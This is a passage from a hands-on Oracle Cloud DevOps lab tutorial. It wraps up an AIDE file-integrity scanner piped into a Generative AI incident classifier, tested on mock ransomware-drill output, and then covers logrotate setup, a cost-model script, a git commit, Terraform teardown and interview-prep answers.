    echo "[2/3] Sending AIDE output to OCI Generative AI incident classifier..." | tee -a "${REPORT_FILE}"

    CLASSIFIER_EXIT=0
    python3 "${HOME}/fedanalytics/ai/incident_classifier.py" \
        < "${AIDE_OUTPUT_FILE}" \
        >> "${REPORT_FILE}" 2>&1 || CLASSIFIER_EXIT=$?

    if [ "${CLASSIFIER_EXIT}" -eq 2 ]; then
        echo "" | tee -a "${REPORT_FILE}"
        echo "  *** CRITICAL SEVERITY DETECTED — IMMEDIATE REVIEW REQUIRED ***" | tee -a "${REPORT_FILE}"
    fi
else
    echo "  [OK] No file system changes detected by AIDE" | tee -a "${REPORT_FILE}"
fi

echo "" | tee -a "${REPORT_FILE}"
echo "[3/3] Report written to: ${REPORT_FILE}" | tee -a "${REPORT_FILE}"
echo "=== Scan complete ===" | tee -a "${REPORT_FILE}"

echo ""
echo "Report saved: ${REPORT_FILE}"
echo "AIDE raw output: ${AIDE_OUTPUT_FILE}"
SHEOF

chmod +x ~/fedanalytics/ai/security_report.sh
echo "Security report script created"
```

**Test the combined script:**

```bash
~/fedanalytics/ai/security_report.sh

# Verify reports are written
ls -la ~/fedanalytics/security_reports/
```

**Add to cron for automated scanning:**

```bash
# Run security scan every 4 hours, logs to a dedicated file
(crontab -l 2>/dev/null; echo "0 */4 * * * /home/opc/fedanalytics/ai/security_report.sh >> /home/opc/fedanalytics/security_reports/cron.log 2>&1") | crontab -

# Verify cron entry
crontab -l
```

> **💼 Interview Insight — Connecting AI to Compliance Controls:** "How does AI fit into a federal security monitoring program?"
>
> **Strong answer:** "AI does not replace controls — it accelerates human response. AIDE is the NIST SI-7 control. OCI GenAI is the triage layer that turns a wall of AIDE output into a prioritized action item in plain English. In a real SOC, level-1 analysts spend hours triaging alerts. The classifier pattern I built does the first-pass categorization: is this Critical, Warning, or Info? That frees the analyst to focus on Critical items immediately. The model also maps each event to a NIST control, which is useful for audit evidence."

---

### Step 26.5 — Test with DR Drill Data

📍 **Where work happens:** App server VM

**Feed the ransomware simulation AIDE output through the classifier:**

If you saved your AIDE output from yesterday's DR drill, feed it through now:

```bash
# If you saved the DR drill AIDE output
cat ~/fedanalytics/security_reports/dr-drill-aide-output.txt \
  | python3 ~/fedanalytics/ai/incident_classifier.py

# If you did not save it, reconstruct a representative sample
cat > /tmp/dr_drill_aide_sample.txt << 'SAMPLEEOF'
AIDE 0.17.4 found differences between database and filesystem!!

File: /usr/bin/ls
 Size     : 142528                            | 143392
 MD5      : bcd47a2f8d5e1c3b9a0e2f4d6c8b1a3e | ff3a1c9d2b4e6f8a0c2e4b6d8f0a2c4e
 SHA256   : (long hash)                       | (different long hash)

File: /etc/crontab
 Size     : 1220                              | 1387
 MD5      : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 | d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1

File: /etc/shadow
 Size     : 1093                              | 1189
 Mtime    : 2024-01-14 08:10:22               | 2024-01-15 02:31:44

Added files:
-----------
f+ /tmp/.hidden_ransom_note.txt
f+ /usr/local/bin/crypto_locker

Removed files:
--------------
f- /home/opc/fedanalytics/backups/backup_20240114.tar.gz
SAMPLEEOF

cat /tmp/dr_drill_aide_sample.txt | python3 ~/fedanalytics/ai/incident_classifier.py
```

**Expected classification of the ransomware drill output:**

The classifier should return something like:

```json
{
  "severity": "Critical",
  "category": "Active ransomware attack — multiple system binaries and shadow file compromised",
  "affected_files": [
    "/usr/bin/ls",
    "/etc/crontab",
    "/etc/shadow",
    "/tmp/.hidden_ransom_note.txt",
    "/usr/local/bin/crypto_locker"
  ],
  "recommended_action": "Immediately isolate the affected host from the network, do not reboot, preserve memory for forensics, and initiate incident response — restore from the last known-good immutable backup.",
  "nist_control": "IR-4",
  "confidence": "High"
}
```

**Save your classifier output as a portfolio artifact:**

```bash
# Run the full security report on the DR drill data
cat /tmp/dr_drill_aide_sample.txt \
  | python3 ~/fedanalytics/ai/incident_classifier.py \
  > ~/fedanalytics/security_reports/dr-drill-ai-classification.txt 2>&1

cat ~/fedanalytics/security_reports/dr-drill-ai-classification.txt
```

Take a screenshot of the terminal showing the Critical severity classification. This is one of your best portfolio screenshots — it shows AI-assisted incident response on OCI infrastructure.

> **💼 Interview Insight — The AI Pillar Progression Across Phases:** "Walk me through how you used AI in your lab project."
>
> **Strong answer:** "I deliberately designed three different AI patterns across three phases to demonstrate the trade-off space. Phase 1 used Ollama — a local LLM I ran directly on an OCI compute instance. No GPU, just CPU inference. The model stayed on-prem, zero data egress, good for sensitive workloads. Phase 2 switched to OCI Generative AI — Oracle's managed service using Cohere Command R+. I call it via HTTPS, no GPU to provision, and the model quality is significantly higher for classification tasks. Phase 3 adds scikit-learn classical ML — a trained classifier for structured log data where you do not need a language model at all. The lesson is: use the right tool for the job. LLMs excel at unstructured text classification. Classical ML excels at structured numerical data with labeled training sets. Cloud-managed AI is right when you need capability without infrastructure. Local AI is right when data classification prohibits egress."

---

### Phase 26 Troubleshooting

| Issue | Likely Cause | Fix |
|-------|-------------|-----|
| `oci.exceptions.ServiceError: 404` | Wrong endpoint URL or model ID | Verify endpoint is `inference.generativeai.us-chicago-1.oci.oraclecloud.com` and model ID matches what is shown in the Console Playground |
| `oci.exceptions.ServiceError: 401 Unauthorized` | Instance principals not configured, or `~/.oci/config` missing | On OCI VM: verify instance principal policy exists in IAM. Off-VM: run `oci setup config` to create `~/.oci/config` |
| `oci.exceptions.ServiceError: 400 Bad Request` | Compartment OCID not updated from placeholder | Replace `<YOUR_COMPARTMENT_OCID>` in `incident_classifier.py` with your real OCID |
| `ImportError: No module named 'oci'` | OCI SDK not installed | Run `pip3 install oci --user` and verify with `python3 -c "import oci"` |
| Model returns text instead of JSON | Model ignored the JSON instruction | Lower temperature to `0.0` and add `"Respond ONLY with JSON, no explanation"` to the prompt |
| `json.JSONDecodeError` in parse step | Model wrapped JSON in markdown fences | The `re.sub` strip logic handles this — check `raw_model_output` in the error response for the actual text returned |
| Classifier times out | OCI GenAI endpoint is cross-region | Add timeout handling in the SDK client config; first call is slower due to TLS handshake |
| AIDE pipe produces empty input | `aide --check` found nothing, all pipes closed | Add `|| true` after `aide --check` to prevent `set -e` from killing the pipeline before output reaches the classifier |
| Instance principal policy error | IAM policy not set for your compartment | Create policy: `Allow dynamic-group <your-dynamic-group-name> to use generative-ai-family in compartment <your-compartment-name>` |

---

## PHASE 27: OPERATIONAL WRAP-UP (1–1.5 hrs)
**Day 5 — Afternoon**

### Step 27.1 — Log Rotation

📍 **Where work happens:** App server VM

FedAnalytics writes to log files. Without rotation, logs grow unbounded and eventually fill the disk. `logrotate` is the standard Linux tool for this — it runs daily via cron and handles rotating, compressing, and pruning old logs automatically.

> **🧠 ELI5 — Log Rotation:** Imagine a notebook where your app writes one line per request. Without rotation, that notebook grows forever. Log rotation is like replacing the full notebook with a fresh one every day, keeping the last 7 days of notebooks in a drawer, and shredding anything older. The `compress` option is like vacuum-sealing the old notebooks so they take less drawer space.

**Create the logrotate configuration:**

```bash
sudo tee /etc/logrotate.d/fedanalytics << 'ROTEOF'
# Log rotation for FedAnalytics application
# Rotates daily, keeps 7 days of compressed history

/home/opc/fedanalytics/logs/*.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
    copytruncate
    create 0640 opc opc
    dateext
    dateformat -%Y%m%d
}

/home/opc/fedanalytics/security_reports/*.txt {
    weekly
    rotate 4
    compress
    delaycompress
    missingok
    notifempty
    copytruncate
    create 0640 opc opc
}
ROTEOF

echo "logrotate config created"
```

**Configuration setting explanation:**

| Setting | What it means |
|---------|--------------|
| `daily` | Rotate logs once per day |
| `rotate 7` | Keep 7 rotated copies before deleting the oldest |
| `compress` | Gzip rotated log files (saves ~70-90% disk space) |
| `delaycompress` | Wait one cycle before compressing — the most recent rotated file stays uncompressed for easy reading |
| `missingok` | Do not error if the log file does not exist yet |
| `notifempty` | Skip rotation if the log file is empty — no point rotating an empty file |
| `copytruncate` | Copy the log to a new name, then truncate the original to zero — keeps the file descriptor valid so the running app does not need a restart |
| `create 0640 opc opc` | Create fresh empty log files after rotation, owned by `opc` with mode 640 |
| `dateext` + `dateformat` | Name rotated files with dates (e.g., `app.log-20240115`) instead of `.1`, `.2`, `.3` |

**Ensure the log directory exists:**

```bash
mkdir -p ~/fedanalytics/logs
touch ~/fedanalytics/logs/fedanalytics.log
touch ~/fedanalytics/logs/access.log
```

**Test the rotation manually:**

```bash
# Force logrotate to run (ignores the daily schedule — useful for testing)
sudo logrotate -f /etc/logrotate.d/fedanalytics

# Verify rotation happened
ls -la ~/fedanalytics/logs/
# Should show original log files (now empty) and compressed rotated copies
```

**Verify the system-wide cron will run it nightly:**

```bash
# logrotate runs from this cron entry on Oracle Linux 9
cat /etc/cron.daily/logrotate

# Manual verification that your config has no syntax errors
sudo logrotate --debug /etc/logrotate.d/fedanalytics
```

> **💼 Interview Insight — Log Management in Production:** "How do you handle log management for a VM-based application?"
>
> **Strong answer:** "For a VM-based app, I use logrotate — I configure rotation frequency, retention, and compression. For a containerized app in Kubernetes, logs go to stdout/stderr and the container runtime handles rotation via `--log-max-size` and `--log-max-file`. In a federal environment, you also need to forward logs to a SIEM before rotation so you retain audit evidence beyond the local window. NIST 800-53 AU-11 specifies how long audit records must be retained — typically 3 years for federal systems. The logrotate config satisfies the local operational need; the SIEM integration satisfies the compliance need."

---

### Step 27.2 — Cost Modeling Script

📍 **Where work happens:** App server VM or local machine

Understanding cloud costs is a core DevOps skill. In federal environments, cost tracking is also a contractual requirement — every OCI resource ties back to a budget line.

> **🧠 ELI5 — Cloud Cost Modeling:** Before you turn off your lab, you want to know: what did this cost, and what would it cost if I ran it in production with real (paid) resources? The cost model answers both questions. It is like getting an itemized receipt for your lab, then extrapolating to "what if I ran this at a federal agency for a year?"

**Create the cost modeling script:**

```bash
mkdir -p ~/fedanalytics/scripts
cat > ~/fedanalytics/scripts/cost_model.py << 'COSTEOF'
#!/usr/bin/env python3
"""
cost_model.py — OCI Phase 2 Lab Cost Model

Documents all Always Free resources used in Phase 2 and calculates
projected costs if the Always Free tier limits were exceeded or if
this architecture were deployed in a paid production environment.

Run this before teardown to capture the cost baseline for your portfolio.

Usage:
    python3 cost_model.py
    python3 cost_model.py --output-json cost_model_output.json
"""

import argparse
import json
from datetime import datetime


# ---------------------------------------------------------------
# RESOURCE INVENTORY — update quantities to match your actual lab
# ---------------------------------------------------------------

LAB_RESOURCES = {
    "compute": [
        {
            "resource_name": "Bastion VM (fedanalytics-bastion)",
            "shape": "VM.Standard.A1.Flex",
            "ocpu_count": 1,
            "memory_gb": 6,
            "architecture": "ARM aarch64",
            "always_free": True,
            "always_free_notes": "A1 Flex: 4 OCPUs + 24 GB RAM total free across all A1 instances",
            "paid_price_per_ocpu_hour_usd": 0.01,
            "paid_price_per_gb_ram_hour_usd": 0.0015,
            "estimated_monthly_hours": 720,
        },
        {
            "resource_name": "k3s Server Node (fedanalytics-k3s-server)",
            "shape": "VM.Standard.A1.Flex",
            "ocpu_count": 2,
            "memory_gb": 12,
            "architecture": "ARM aarch64",
            "always_free": True,
            "always_free_notes": "Part of the 4 OCPU / 24 GB A1 free allocation",
            "paid_price_per_ocpu_hour_usd": 0.01,
            "paid_price_per_gb_ram_hour_usd": 0.0015,
            "estimated_monthly_hours": 720,
        },
    ],
    "database": [
        {
            "resource_name": "Oracle Autonomous Database (fedanalytics-adb)",
            "db_type": "Autonomous Transaction Processing",
            "ocpu_count": 1,
            "storage_tb": 0.02,  # 20 GB
            "always_free": True,
            "always_free_notes": "2 ADB instances with 1 OCPU and 20 GB storage each",
            "paid_price_per_ocpu_hour_usd": 0.2268,
            "paid_price_per_tb_month_usd": 25.60,
            "estimated_monthly_hours": 720,
        },
    ],
    "networking": [
        {
            "resource_name": "VCN (fedanalytics-vcn)",
            "always_free": True,
            "always_free_notes": "VCNs, route tables, security lists: always free",
            "paid_monthly_cost_usd": 0.00,
        },
        {
            "resource_name": "Load Balancer (fedanalytics-lb)",
            "bandwidth_mbps": 10,
            "always_free": True,
            "always_free_notes": "1 flexible load balancer with 10 Mbps bandwidth always free",
            "paid_price_per_hour_usd": 0.0252,
            "estimated_monthly_hours": 720,
        },
        {
            "resource_name": "Outbound Data Transfer",
            "always_free": True,
            "always_free_notes": "10 TB/month outbound always free",
            "estimated_monthly_gb": 5,
            "paid_price_per_gb_usd": 0.0085,
        },
    ],
    "storage": [
        {
            "resource_name": "Object Storage Bucket (fedanalytics-backups)",
            "storage_gb": 2,
            "always_free": True,
            "always_free_notes": "20 GB Object Storage always free",
            "paid_price_per_gb_month_usd": 0.0255,
        },
        {
            "resource_name": "Block Volume Boot Disks (2x 50 GB)",
            "storage_gb": 100,
            "always_free": True,
            "always_free_notes": "200 GB total block volume storage always free",
            "paid_price_per_gb_month_usd": 0.0255,
        },
    ],
    "ai_services": [
        {
            "resource_name": "OCI Generative AI (Cohere Command R+)",
            "model": "cohere.command-r-plus",
            "usage_type": "On-demand text generation",
            "always_free": True,
            "always_free_notes": "GenAI has a free tier for text generation — verify current OCI pricing for current limits",
            "paid_price_per_million_tokens_usd": 3.00,
            "estimated_monthly_tokens": 50000,
        },
    ],
}


def calculate_compute_monthly_cost(resource):
    ocpu_cost = (resource["ocpu_count"]
                 * resource["paid_price_per_ocpu_hour_usd"]
                 * resource["estimated_monthly_hours"])
    ram_cost = (resource["memory_gb"]
                * resource["paid_price_per_gb_ram_hour_usd"]
                * resource["estimated_monthly_hours"])
    return ocpu_cost + ram_cost


def calculate_database_monthly_cost(resource):
    ocpu_cost = (resource["ocpu_count"]
                 * resource["paid_price_per_ocpu_hour_usd"]
                 * resource["estimated_monthly_hours"])
    storage_cost = resource["storage_tb"] * resource["paid_price_per_tb_month_usd"]
    return ocpu_cost + storage_cost


def build_cost_report():
    report = {
        "generated_at": datetime.utcnow().isoformat() + "Z",
        "phase": "Phase 2 — FedAnalytics DR",
        "always_free_lab_cost_usd": 0.00,
        "projected_paid_monthly_cost_usd": 0.00,
        "projected_paid_annual_cost_usd": 0.00,
        "line_items": [],
    }

    total_paid_monthly = 0.0

    for compute_resource in LAB_RESOURCES["compute"]:
        paid_monthly = calculate_compute_monthly_cost(compute_resource)
        total_paid_monthly += paid_monthly
        report["line_items"].append({
            "category": "Compute",
            "resource": compute_resource["resource_name"],
            "shape": compute_resource["shape"],
            "specs": f"{compute_resource['ocpu_count']} OCPU / {compute_resource['memory_gb']} GB RAM",
            "always_free": compute_resource["always_free"],
            "lab_cost_usd": 0.00,
            "paid_monthly_cost_usd": round(paid_monthly, 2),
        })

    for db_resource in LAB_RESOURCES["database"]:
        paid_monthly = calculate_database_monthly_cost(db_resource)
        total_paid_monthly += paid_monthly
        report["line_items"].append({
            "category": "Database",
            "resource": db_resource["resource_name"],
            "specs": f"{db_resource['ocpu_count']} OCPU / {db_resource['storage_tb'] * 1024:.0f} GB",
            "always_free": db_resource["always_free"],
            "lab_cost_usd": 0.00,
            "paid_monthly_cost_usd": round(paid_monthly, 2),
        })

    for net_resource in LAB_RESOURCES["networking"]:
        if "paid_price_per_hour_usd" in net_resource:
            paid_monthly = net_resource["paid_price_per_hour_usd"] * net_resource.get("estimated_monthly_hours", 720)
        elif "paid_price_per_gb_usd" in net_resource:
            paid_monthly = net_resource["paid_price_per_gb_usd"] * net_resource.get("estimated_monthly_gb", 0)
        else:
            paid_monthly = net_resource.get("paid_monthly_cost_usd", 0.0)
        total_paid_monthly += paid_monthly
        report["line_items"].append({
            "category": "Networking",
            "resource": net_resource["resource_name"],
            "always_free": net_resource["always_free"],
            "lab_cost_usd": 0.00,
            "paid_monthly_cost_usd": round(paid_monthly, 2),
        })

    for storage_resource in LAB_RESOURCES["storage"]:
        paid_monthly = (storage_resource["storage_gb"]
                        * storage_resource["paid_price_per_gb_month_usd"])
        total_paid_monthly += paid_monthly
        report["line_items"].append({
            "category": "Storage",
            "resource": storage_resource["resource_name"],
            "specs": f"{storage_resource['storage_gb']} GB",
            "always_free": storage_resource["always_free"],
            "lab_cost_usd": 0.00,
            "paid_monthly_cost_usd": round(paid_monthly, 2),
        })

    for ai_resource in LAB_RESOURCES["ai_services"]:
        paid_monthly = ((ai_resource["estimated_monthly_tokens"] / 1_000_000)
                        * ai_resource["paid_price_per_million_tokens_usd"])
        total_paid_monthly += paid_monthly
        report["line_items"].append({
            "category": "AI Services",
            "resource": ai_resource["resource_name"],
            "specs": ai_resource["model"],
            "always_free": ai_resource["always_free"],
            "lab_cost_usd": 0.00,
            "paid_monthly_cost_usd": round(paid_monthly, 2),
        })

    report["projected_paid_monthly_cost_usd"] = round(total_paid_monthly, 2)
    report["projected_paid_annual_cost_usd"] = round(total_paid_monthly * 12, 2)
    return report


def print_cost_table(report):
    print("\n" + "=" * 72)
    print("  OCI PHASE 2 LAB — COST MODEL")
    print(f"  Generated: {report['generated_at']}")
    print("=" * 72)
    print(f"  {'Category':<18} {'Resource':<36} {'Paid/Mo':>10}")
    print(f"  {'-'*18} {'-'*36} {'-'*10}")

    for line_item in report["line_items"]:
        free_marker = " (FREE)" if line_item["always_free"] else ""
        resource_display = line_item["resource"][:34]
        print(f"  {line_item['category']:<18} {resource_display:<36} "
              f"${line_item['paid_monthly_cost_usd']:>8.2f}{free_marker}")

    print(f"  {'':18} {'':36} {'':10}")
    print(f"  {'TOTAL (if paid)':<54} ${report['projected_paid_monthly_cost_usd']:>8.2f}")
    print(f"  {'ANNUAL PROJECTION':<54} ${report['projected_paid_annual_cost_usd']:>8.2f}")
    print("=" * 72)
    print(f"\n  Your actual lab cost: $0.00 (Always Free tier)")
    print(f"  Paid equivalent: ${report['projected_paid_monthly_cost_usd']:.2f}/month")
    print(f"  Note: Verify current OCI pricing at cloud.oracle.com/en_US/calculator")
    print("=" * 72 + "\n")


def main():
    parser = argparse.ArgumentParser(description="OCI Phase 2 cost model")
    parser.add_argument("--output-json", metavar="FILENAME",
                        help="Write full cost report to a JSON file")
    args = parser.parse_args()

    report = build_cost_report()
    print_cost_table(report)

    if args.output_json:
        with open(args.output_json, "w") as json_output_file:
            json.dump(report, json_output_file, indent=2)
        print(f"Full JSON report saved to: {args.output_json}")


if __name__ == "__main__":
    main()
COSTEOF

chmod +x ~/fedanalytics/scripts/cost_model.py
echo "Cost model script created"
```

**Run the cost model and save the output:**

```bash
python3 ~/fedanalytics/scripts/cost_model.py

# Save JSON output for your portfolio
python3 ~/fedanalytics/scripts/cost_model.py \
    --output-json ~/fedanalytics/scripts/phase2-cost-model.json

cat ~/fedanalytics/scripts/phase2-cost-model.json
```

> **💼 Interview Insight — Cloud Cost Management:** "How do you control costs in a cloud environment?"
>
> **Strong answer:** "I use three layers. First, always-free or pre-provisioned resources wherever possible — in my OCI lab, everything ran on Always Free, which I proved with a cost model script. Second, tagging — every resource I provision has a Project, Environment, and CostCenter tag. OCI Cost Analysis can then filter by tag to show per-project spend. Third, budgets and alerts — set a budget in OCI or AWS, configure an alert at 80% of budget, and you will never get a surprise bill. For this lab, I documented what the equivalent paid infrastructure would cost: about $150-250/month on OCI at production scale. That lets me tell a hiring manager 'I built a federal DR environment for $0 in a lab, and I understand it maps to approximately $X/month in production.'"

---

### Step 27.3 — Git Commit Everything

📍 **Where work happens:** App server VM or local machine (wherever you cloned the repo)

Before teardown, commit all Phase 2 artifacts to version control.

```bash
cd ~/oci-federal-lab-phase2

# Stage all Phase 2 artifacts
git add phases/phase-2-fedanalytics-dr/

# Review what you are committing
git status
git diff --stat HEAD

# Commit with a structured message
git commit -m "$(cat <<'COMMITEOF'
Phase 2 complete: FedAnalytics DR environment — 5-day build

Infrastructure:
- Terraform: VCN, bastion, k3s nodes (A1 Flex ARM), Autonomous DB, Object Storage
- Ansible: OS hardening, FedAnalytics deployment, AIDE installation

Application:
- FedAnalytics FastAPI: /health, /ingest, /metrics, /logs, /webhook endpoints
- HMAC webhook signature validation
- Oracle Autonomous DB integration

Kubernetes:
- k3s cluster on ARM Oracle Linux 9
- FedAnalytics deployed as k8s Deployment + Service
- OCI Load Balancer integration

DR Architecture:
- Object Storage with versioning and WORM retention locks
- Scheduled backup scripts and Jenkins backup validation pipeline
- Full ransomware simulation with measured RTO/RPO recovery

CI/CD:
- Jenkins baseline and CloudBees CI migration
- Folder RBAC, Configuration as Code (CasC), audit trail
- Scheduled backup validation pipeline

AI Integration:
- OCI Generative AI incident classifier (Cohere Command R+)
- AIDE and GenAI combined security report script
- Automated cron scanning with AI triage

Operations:
- logrotate configuration for FedAnalytics logs
- Phase 2 cost model (Always Free = $0, paid equivalent documented)
COMMITEOF
)"

# Push to remote
git push origin master
```

**Verify the push succeeded:**

```bash
git log --oneline -5
git status
```

---

### Step 27.4 — Phase 2 Teardown Instructions

📍 **Where work happens:** Local machine (Terraform) + OCI Console (verification)

> **STOP — Save Artifacts Before Teardown**

Before running `terraform destroy`, confirm you have the following saved locally or in your git repo:

**Portfolio checkpoint — verify each item:**

```bash
# Checklist — confirm each file exists before proceeding
echo "=== Phase 2 Portfolio Artifact Checklist ==="

check_artifact() {
    if [ -e "$1" ]; then
        echo "  FOUND: $1"
    else
        echo "  MISSING: $1 — DO NOT PROCEED UNTIL SAVED"
    fi
}

# Generated reports
echo ""
echo "Generated files:"
check_artifact "${HOME}/fedanalytics/security_reports/dr-drill-ai-classification.txt"
check_artifact "${HOME}/fedanalytics/scripts/phase2-cost-model.json"
check_artifact "${HOME}/oci-federal-lab-phase2/docs/jenkins-vs-cloudbees-comparison.md"

echo ""
echo "Screenshots (verify docs/screenshots/ in your repo):"
echo "  - phase-2-k3s-cluster.png          (kubectl get nodes output)"
echo "  - phase-2-aide-report.png           (AIDE finding changes)"
echo "  - phase-2-dr-drill-recovery.png     (app running after recovery)"
echo "  - phase-2-cloudbees-ci.png          (CloudBees CI dashboard)"
echo "  - phase-2-genai-classifier.png      (incident classifier output)"
```

Once all artifacts are confirmed, proceed with teardown:

**Step 1 — Export final state snapshot:**

```bash
cd ~/oci-federal-lab-phase2/terraform

# Capture current Terraform state for reference
terraform show > ../docs/terraform-final-state-phase2.txt

git add ../docs/terraform-final-state-phase2.txt
git commit -m "Add final Terraform state snapshot before Phase 2 teardown"
git push
```

**Step 2 — Run Terraform destroy:**

```bash
cd ~/oci-federal-lab-phase2/terraform

# Preview what will be destroyed
terraform plan -destroy

# Confirm everything looks correct, then destroy
terraform destroy

# Terraform will prompt: "Do you really want to destroy all resources?"
# Type: yes
```

> **Note on Autonomous Database:** ADB may take 3-5 minutes to terminate. Terraform will wait. If it times out, check the OCI Console — the DB may still be terminating in the background.

**Step 3 — Verify all resources are gone in OCI Console:**

After `terraform destroy` completes, manually verify in OCI Console. This step is important — orphaned resources can incur costs.

```
OCI Console verification checklist:
  Compute → Instances          — no instances in fedanalytics-lab compartment
  Networking → VCNs            — no VCNs in fedanalytics-lab compartment
  Database → Autonomous        — no ADB instances (or status = Terminated)
  Storage → Buckets            — fedanalytics-backups bucket deleted
  Networking → Load Balancers  — no load balancers
  Identity → Dynamic Groups    — fedanalytics-dynamic-group deleted (if created)
```

**Step 4 — Remove local Terraform state:**

```bash
# After verifying in Console, clean up local state
cd ~/oci-federal-lab-phase2/terraform
rm -f terraform.tfstate terraform.tfstate.backup

# Note: never commit .tfstate files — they contain sensitive resource metadata
```

> **💼 Interview Insight — Teardown as a Skill:** "Why does a lab teardown matter for an interview?"
>
> **Strong answer:** "Teardown demonstrates that I treat infrastructure as ephemeral, not as pets. The whole point of IaC is that 'destroy and rebuild' is a valid operational procedure. When I ran `terraform destroy`, I verified everything was gone — not just trusted the output. In a real environment, orphaned resources mean surprise bills. At a federal agency, orphaned resources also mean an unauthorized attack surface that auditors will flag. The teardown discipline — document first, verify artifacts exist, destroy, confirm in console — is the same process you would run before decommissioning a production server."

---

### Step 27.5 — Phase 2 Complete

📍 **Where work happens:** Everywhere — this is your wrap-up

**What you built across 5 days:**

Take a moment to read through this list. Each bullet is a skill you can discuss in an interview.

- Rebuilt Phase 1 infrastructure pattern from memory (proving it is muscle memory, not a tutorial follow-along)
- Deployed FedAnalytics FastAPI application with webhook endpoints, HMAC signature validation, and Oracle ADB integration
- Configured AIDE file integrity monitoring with baseline creation, scheduled checks, and cron automation
- Deployed a k3s Kubernetes cluster on ARM (aarch64) Oracle Linux 9 VMs
- Configured OCI Load Balancer to front the k3s cluster
- Set up Object Storage with versioning and WORM retention locks for immutable backups
- Migrated from open-source Jenkins to CloudBees CI with RBAC, Configuration as Code, and audit trail
- Simulated a ransomware attack: corrupted binaries, modified SSH config, encrypted fake data files
- Measured and achieved a defined RTO by recovering the FedAnalytics service from immutable backups
- Integrated OCI Generative AI (Cohere Command R+) as an incident classifier fed by AIDE output
- Built a combined AIDE + GenAI security report script with cron automation
- Configured logrotate for production-grade log management
- Built a cost model documenting Always Free usage and paid-equivalent projections

**Skills progression table:**

| Pillar | Phase 1 | Phase 2 Progression |
|--------|---------|---------------------|
| **Infrastructure as Code** | Terraform basics, single VM + bastion | Multi-node architecture, k3s cluster, ADB, Object Storage WORM |
| **Configuration Management** | Ansible hardening + deploy | Ansible drift detection, AIDE baseline management |
| **Application Development** | FastAPI fundamentals, REST endpoints | Webhooks, HMAC validation, event-driven patterns |
| **Database** | ADB connection + basic schema | Backup/restore drills, RTO/RPO measurement |
| **Container Orchestration** | Single-container Podman/Docker | k3s Kubernetes cluster, Deployments, Services, kubectl |
| **Backup and Recovery** | Manual block volume snapshots | Immutable Object Storage, versioning, retention locks, measured RTO |
| **Security Monitoring** | Bash health check script | AIDE file integrity (NIST SI-7), change detection, ransomware simulation |
| **CI/CD** | Jenkins pipeline | CloudBees CI migration, RBAC, CasC, audit trail (NIST AU-2/AU-3) |
| **AI Integration** | Ollama local inference (no GPU) | OCI GenAI cloud inference (Cohere Command R+), prompt engineering, classification |
| **Operations** | systemd service management | logrotate, cost modeling, IaC teardown discipline |

**Portfolio artifacts to link in your resume or LinkedIn:**

1. `phases/phase-2-fedanalytics-dr/terraform/` — multi-node OCI Terraform configuration
2. `phases/phase-2-fedanalytics-dr/ansible/` — hardening + deploy playbooks
3. `phases/phase-2-fedanalytics-dr/app/main.py` — FedAnalytics FastAPI with webhooks
4. `phases/phase-2-fedanalytics-dr/ai/incident_classifier.py` — OCI GenAI classifier
5. `phases/phase-2-fedanalytics-dr/jenkins/casc/jenkins.yaml` — CloudBees CasC
6. `phases/phase-2-fedanalytics-dr/scripts/cost_model.py` — cost modeling script
7. `docs/screenshots/phase-2-*.png` — visual evidence for hiring managers
8. `security_reports/dr-drill-ai-classification.txt` — AI-classified ransomware simulation output

> **💼 Interview Insight — Telling the Phase 2 Story:** "Tell me about a complex infrastructure project you built."
>
> **Strong answer:** "In Phase 2 of my OCI federal lab, I built a disaster recovery environment on Oracle Cloud Always Free infrastructure — zero cost. I deployed a k3s Kubernetes cluster on ARM instances running Oracle Linux 9, fronted by an OCI Load Balancer, with Oracle Autonomous Database as the backend. I implemented AIDE file integrity monitoring to satisfy NIST 800-53 SI-7, set up Object Storage with WORM retention locks for immutable backups, and then simulated a ransomware attack: corrupted system binaries, modified SSH configuration, encrypted application data. I measured the recovery time against a defined RTO — brought the FedAnalytics service back to operational status from immutable backups within the target window. I also integrated OCI Generative AI as an incident classifier: AIDE output feeds directly into a Cohere Command R+ model that triages each alert as Critical, Warning, or Info and maps it to a NIST control. The whole thing runs for $0 on Always Free. If I deployed it at a federal agency, the paid equivalent is about $150-250 per month on OCI."

---

### Phase 27 Troubleshooting

| Issue | Likely Cause | Fix |
|-------|-------------|-----|
| `logrotate` does not rotate even with `-f` | Log directory does not exist | `mkdir -p ~/fedanalytics/logs` and `touch` a placeholder log file |
| Rotated files not compressed immediately | `delaycompress` is working as intended | The current rotation is not compressed — the previous one will be. Wait one cycle or remove `delaycompress` |
| `git push` rejected (non-fast-forward) | Remote has commits your local does not | Run `git pull --rebase origin master` then re-push |
| `terraform destroy` hangs on ADB | ADB termination can take 5+ minutes | Wait — do not Ctrl+C. If it times out, check OCI Console and re-run `terraform destroy` |
| Orphaned resources remain after destroy | Manually created resources not in Terraform state | Delete them manually in OCI Console — Terraform only manages what it provisioned |
| Cost model shows wrong resource counts | Placeholder values not updated | Edit `LAB_RESOURCES` in `cost_model.py` to match your actual deployed resources before saving |
| `git status` shows untracked files | Files created outside the repo directory | Move files into `~/oci-federal-lab-phase2/` or add their paths explicitly with `git add` |
| Jenkins audit log missing entries | Audit Trail plugin log path wrong | Verify `/var/log/jenkins/audit.log` path in Manage Jenkins → System → Audit Trail |

---

## PHASE 2 — COMPLETE

**What you built across 5 days:**

- **Day 1** — Re-provisioned Phase 1 infrastructure pattern from memory: Terraform VCN + bastion + app server (A1 Flex ARM) + Autonomous Database; Ansible hardening + FedAnalytics deployment
- **Day 2** — FedAnalytics FastAPI application with webhook endpoints and HMAC signature validation; AIDE file integrity monitoring baseline; Object Storage with WORM retention locks and versioning
- **Day 3** — k3s Kubernetes cluster on ARM Oracle Linux 9; OCI Load Balancer integration; FedAnalytics running as a Kubernetes Deployment + Service; Jenkins CI/CD migrated to CloudBees CI with RBAC, CasC, and audit trail
- **Day 4** — Full ransomware simulation: binary corruption, SSH config modification, data encryption; AIDE detection of all changes; measured RTO/RPO recovery from immutable Object Storage backups
- **Day 5** — OCI Generative AI incident classifier (Cohere Command R+) integrated with AIDE; combined security report script with cron automation; logrotate configuration; cost model; teardown with artifact preservation

**Skills demonstrated:**

| Pillar | Phase 1 | Phase 2 Progression |
|--------|---------|---------------------|
| **Infrastructure as Code** | Terraform single VM + bastion | Multi-node k3s cluster, ADB, Object Storage WORM, LB |
| **Configuration Management** | Ansible hardening + deploy | Drift detection, AIDE baseline automation |
